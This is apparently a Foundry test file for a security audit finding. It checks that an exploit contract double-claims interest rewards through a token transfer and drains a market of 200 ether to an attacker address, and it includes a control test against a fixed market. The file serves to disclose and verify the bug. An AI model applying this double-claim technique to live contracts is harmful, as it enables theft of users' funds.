// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {
    CErc721Fixed,
    Claimer,
    Exploit,
    RewardToken
} from "./62379-fng-11-all-interest-tokens-can-be-stolen-from-the-interest-m.sol";

contract Finding62379Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_transfer_double_claims_the_interest_market() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.market().receiverIndexAfter(), 1e18, "receiver index not updated");
        assertEq(e.market().drained(), 200 ether, "rewards paid twice");
        assertEq(e.reward().balanceOf(ATTACKER), 200 ether, "attacker took both claims");
        assertEq(e.reward().balanceOf(address(e.market())), 0, "market emptied");
    }

    function test_control_transfer_sync_pays_the_index_once() public {
        RewardToken reward = new RewardToken();
        CErc721Fixed market = new CErc721Fixed(reward);
        Claimer claimer = new Claimer();

        reward.mint(address(market), 200 ether);
        market.mint(address(this), 100 ether);
        market.poke(address(this));
        claimer.pokeFixed(market);
        market.accrue();

        market.transfer(address(claimer), 100 ether);
        claimer.takeFixed(market, address(this));

        assertEq(reward.balanceOf(address(this)), 100 ether, "only the holder is paid");
        assertEq(reward.balanceOf(address(market)), 100 ether, "the second 100 stays");
        assertEq(reward.balanceOf(address(claimer)), 0, "receiver was synced to the new index");
    }
}
